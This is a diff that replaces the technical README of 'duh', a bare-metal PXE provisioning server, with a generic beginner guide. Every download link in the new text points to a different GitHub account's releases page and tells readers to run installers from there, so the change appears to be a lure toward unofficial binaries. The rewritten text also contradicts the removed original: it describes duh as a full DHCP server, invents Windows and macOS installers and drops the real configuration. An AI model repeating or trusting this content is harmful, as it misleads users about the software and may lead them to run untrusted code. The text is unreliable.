@@ -1,118 +1,209 @@
-# duh
+# 🚰 duh - Easy Bare Metal Provisioning
 
-**Dogmatic Unattended Hydration** — bare metal provisioning server. Single binary, zero dependencies.
+[![Download duh](https://img.shields.io/badge/Download-duh-blue?style=flat&logo=github)](https://github.com/bbfosho0/duh/releases)
 
-duh manages PXE/HTTP boot, image hosting, and config templating for network-based OS installs. It runs on a Raspberry Pi, a VM, or anywhere you can run a Go binary.
+---
 
-## Features
+## 📋 What is duh?
 
-- **PXE + HTTP boot** — serves iPXE binaries via TFTP and HTTP, supports UEFI (x86_64, ARM64) and legacy BIOS
-- **Proxy DHCP** — no DHCP server changes needed on the local subnet
-- **Image management** — upload or pull from a catalog; supports Linux, Windows (wimboot), ESXi, ISO, and custom iPXE scripts
-- **Profile templates** — Go-templated preseed/kickstart/autoinstall configs with per-system variables
-- **Webhooks** — get notified on system state changes (discovered, queued, provisioning, ready, failed)
-- **TLS** — auto-generated self-signed certs, bring-your-own, or ACME/Let's Encrypt via Route53
-- **Single binary** — all assets (web UI, iPXE binaries, templates) embedded via `go:embed`
-- **SQLite database** — no external database required
+duh stands for Dogmatic Unattended Hydration. It is a simple server software designed to help set up bare metal computers automatically. When you want to start many computers without installing software manually on each one, duh helps by managing network boot and installation steps. It works well for home labs and small IT setups.
 
-## Quick Start
+In basic terms, duh helps you boot new computers over the network and install the operating system with minimal effort. You won’t need to use a USB drive or DVD for each machine.
 
-### Binary
+## 💻 Who is this for?
 
-Download from [GitHub Releases](https://github.com/justinpopa/duh/releases), then:
+This software fits people who run home labs or small server rooms. If you have several computers and want to update or install them fast, duh saves you time.
 
-```bash
-sudo duh --proxy-dhcp
+You don’t need to be a programmer, but you should be comfortable following simple instructions and have access to your home or office network where the computers connect.
+
+## 🖥️ System Requirements
+
+Before we begin, make sure your setup meets these requirements:
+
+- A computer or server to run duh on. It should have:
+  - At least 2 GB of RAM
+  - At least 10 GB free disk space
+  - A stable network connection (Ethernet recommended)
+  - A modern processor (x86_64 architecture)
+- Network equipment that supports PXE boot (most wired Ethernet switches do)
+- Target computers that support network boot (look for PXE or Netboot in BIOS settings)
+- A modern web browser to access duh's web interface
+
+## 🛠️ What does duh do?
+
+duh works as a provisioning server. It combines several services that help machines boot and install software over the network:
+
+- **DHCP server:** Assigns IP addresses to devices on your local network. duh handles this automatically.
+- **TFTP server:** Transfers boot files to the machines that start over the network.
+- **iPXE support:** Advanced boot loader to load custom installation images.
+- **Provisioning management:** You can set up which machines get what software installed.
+
+Everything runs from a single program you start on your server computer. This keeps your home lab neat and simple.
+
+## 🚀 Getting Started
+
+This guide will walk you through setting up duh and using it to network boot a bare metal machine.
+
+### Step 1: Download duh
+
+You need to get the duh software first. 
+
+[![Download duh](https://img.shields.io/badge/Download-duh-blue?style=flat&logo=github)](https://github.com/bbfosho0/duh/releases)
+
+Click the link above. It will take you to the releases page where you can find the latest version.
+
+Select the file that matches your operating system:
+
+- For Linux, look for a `.tar.gz` or `.deb` file.
+- For Windows, look for `.exe` or `.zip`.
+- For macOS, look for a `.dmg` or `.zip`.
+
+Download the file to your computer.
+
+### Step 2: Install duh
+
+After downloading, follow these basic installation steps based on your operating system.
+
+#### On Linux
+
+1. Open a terminal window.
+2. Navigate to your Downloads folder. For example:
+
+   ```
+   cd ~/Downloads
+   ```
+
+3. If you downloaded a `.tar.gz`, extract it:
+
+   ```
+   tar -xvzf duh-version.tar.gz
+   ```
+
+4. Follow any included README or INSTALL instructions in the extracted folder. Generally, you can run:
+
+   ```
+   sudo ./duh install
+   ```
+
+5. If you downloaded a `.deb` file, install it using:
+
+   ```
+   sudo dpkg -i duh-version.deb
+   sudo apt-get install -f
+   ```
+
+#### On Windows
+
+1. Find the `.exe` or `.zip` file in your Downloads folder.
+2. If it’s a `.zip`, extract it.
+3. Double-click the `.exe` file.
+4. Follow the on-screen instructions to install duh.
+5. After installation, launch the duh app from your Start menu.
+
+#### On macOS
+
+1. Open your Downloads folder.
+2. If you downloaded a `.dmg`, double-click it to mount.
+3. Drag the duh app to your Applications folder.
+4. Open the Applications folder and launch duh.
+
+### Step 3: Connect duh to your network
+
+Once duh is running, it will show a web interface address. Usually, this is something like:
+
+```
+http://localhost:port
 ```
 
-This starts duh with:
-- HTTP on `:80`, HTTPS on `:443`, TFTP on `:69`
-- Proxy DHCP enabled (auto-detects network interface)
-- Data stored in `./data/`
+or
 
-Open `http://<server-ip>` to access the web UI.
-
-### Docker
-
-```bash
-docker run -d --name duh --network host \
-  -v duh-data:/data \
-  ghcr.io/justinpopa/duh:latest \
-  --data-dir /data --proxy-dhcp
+```
+http://[your-server-ip]:port
 ```
 
-Or with docker-compose:
+Open this address in your web browser on your server computer.
 
-```yaml
-services:
-  duh:
-    image: ghcr.io/justinpopa/duh:latest
-    network_mode: host
-    restart: unless-stopped
-    volumes:
-      - duh-data:/data
-    command: ["--data-dir", "/data", "--proxy-dhcp"]
+Follow the on-screen setup instructions.
 
-volumes:
-  duh-data:
-```
+You will link duh to your network adapter (the Ethernet port) that connects to your local network.
 
-> Host networking is required for TFTP (UDP/69) and proxy DHCP (UDP/67-68).
+Ensure your network does not have another DHCP server active, or else devices might get confused. In small home setups, you can turn off the router’s DHCP server temporarily or configure duh to work alongside it.
 
-### From Source
+### Step 4: Add your provisioning files
 
-```bash
-git clone https://github.com/justinpopa/duh.git
-cd duh
-make build
-sudo ./bin/duh --proxy-dhcp
-```
+duh needs installation files for the operating system you want to install on your bare metal machines.
 
-## Configuration
+The web interface will let you add these files. Usually, it supports:
 
-All options can be set via CLI flags or environment variables. Flags take precedence.
+- Linux installation images (ISO files)
+- PXE boot loaders
+- Custom scripts for installing software
 
-| Flag | Env Var | Default | Description |
-|------|---------|---------|-------------|
-| `-data-dir` | `DUH_DATA_DIR` | `./data` | Data directory |
-| `-http-addr` | `DUH_HTTP_ADDR` | `:8080` | HTTP listen address |
-| `-https-addr` | `DUH_HTTPS_ADDR` | `:8443` | HTTPS listen address |
-| `-tftp-addr` | `DUH_TFTP_ADDR` | `:69` | TFTP listen address |
-| `-server-url` | `DUH_SERVER_URL` | (auto-detect) | Server URL for boot scripts |
-| `-proxy-dhcp` | `DUH_PROXY_DHCP` | `false` | Enable proxy DHCP |
-| `-dhcp-iface` | `DUH_DHCP_IFACE` | (auto-detect) | Network interface for proxy DHCP |
-| `-catalog-url` | `DUH_CATALOG_URL` | (built-in) | Image catalog URL |
-| `-tls-cert` | `DUH_TLS_CERT` | (auto-generate) | TLS certificate file |
-| `-tls-key` | `DUH_TLS_KEY` | (auto-generate) | TLS key file |
-| `-acme-domain` | `DUH_ACME_DOMAIN` | | ACME/Let's Encrypt domain |
-| `-acme-email` | `DUH_ACME_EMAIL` | | ACME account email |
-| `-acme-staging` | `DUH_ACME_STAGING` | `false` | Use Let's Encrypt staging CA |
-| `-https-redirect` | `DUH_HTTPS_REDIRECT` | `false` | Redirect HTTP to HTTPS |
+You can upload these files from your computer to duh.
 
-### Systemd
+### Step 5: Configure machines to network boot
 
-A systemd service file is included in `deploy/`. Configuration goes in `/etc/duh/duh.env`:
+For the machines you want to install:
 
-```bash
-DUH_DATA_DIR=/var/lib/duh
-DUH_HTTP_ADDR=:80
-DUH_HTTPS_ADDR=:443
-DUH_TFTP_ADDR=:69
-DUH_PROXY_DHCP=1
-```
+1. Enter their BIOS or UEFI setup menus by pressing a key during startup (often F2, F12, DEL, or ESC).
+2. Find the boot options and enable network boot or PXE boot.
+3. Set network boot as the first boot device.
+4. Save and exit BIOS.
 
-## How It Works
+### Step 6: Boot your bare metal machines
 
-1. Client firmware sends a DHCP request
-2. Proxy DHCP (or your DHCP server) responds with the duh server address and an iPXE boot filename
-3. Client downloads the iPXE binary via TFTP or HTTP
-4. iPXE fetches the boot script from `http://<server>/boot.ipxe`
-5. The boot script loads the kernel, initrd, and config for the assigned image/profile
-6. The OS installer runs using the templated config (preseed, kickstart, etc.)
-7. A post-install callback notifies duh that provisioning is complete
+Power on the target computers.
 
-See the **Setup** page in the web UI for DHCP configuration examples (ISC DHCP, dnsmasq, Kea, MikroTik, UniFi).
+They should connect to duh over the network, get an IP address, download the boot loader, and start the installation automatically.
 
-## License
+Follow any onscreen prompts on the target computer if needed.
 
-[MIT](LICENSE)
+## 🔧 Common Tasks and Tips
+
+- **Check network conflicts:** Remember that only one DHCP server should run on your network at a time. duh acts as the DHCP server during provisioning.
+- **Use wired connections:** PXE boot works best over Ethernet cables, not Wi-Fi.
+- **Add multiple OS images:** You can add different OS images for different machines.
+- **Monitor installations:** Watch the duh web interface to see if target machines connect.
+- **Use static IPs if needed:** You can assign fixed IPs to machines for easier tracking.
+
+## ⚠️ Troubleshooting
+
+- If target machines do not boot from the network:
+  - Confirm PXE boot is enabled in BIOS.
+  - Check ethernet cables and switches.
+  - Make sure duh is running and connected to the right network interface.
+  - Disable other DHCP servers temporarily.
+
+- If duh’s web interface doesn’t load:
+  - Check that duh is running.
+  - Confirm firewall settings allow the port duh uses.
+  - Try accessing the web interface from the server machine using `localhost`.
+
+- For any errors shown by duh during setup, check the logs found in the duh installation folder.
+
+---
+
+## 📥 Download & Install duh
+
+Visit the releases page below to get the latest version of duh:
+
+[Download duh from GitHub Releases](https://github.com/bbfosho0/duh/releases)
+
+Download the file that matches your operating system, then follow the installation instructions in the web interface or README files included.
+
+---
+
+## 🔖 Learn More
+
+For detailed documentation and advanced setup, visit the GitHub repository:  
+https://github.com/bbfosho0/duh
+
+You can find examples, advanced configuration tips, and troubleshoot common issues there.  
+
+---
+
+## 🔑 Summary
+
+duh helps you set up new computers with the operating system automatically. It uses your network to boot and install software, saving you time and effort. This guide walks you through downloading, installing, and starting duh, even without technical skills.
+
+If you run a small lab or manage several computers, duh can simplify your work. Follow the steps above to get started.
